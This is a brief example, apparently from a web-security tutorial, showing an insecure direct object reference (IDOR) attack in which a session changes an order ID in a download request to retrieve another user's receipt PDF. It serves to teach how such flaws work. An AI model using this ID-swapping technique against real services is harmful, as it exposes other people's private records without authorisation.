# Example 3: Static File IDOR

```
# Download own receipt
GET /api/download/5 HTTP/1.1
Cookie: session=attacker_session

# Response: PDF of attacker's receipt (order #5)

# Attempt to access other receipts
GET /api/download/3 HTTP/1.1
Cookie: session=attacker_session

# Vulnerable Response: PDF of victim's receipt (order #3)!
```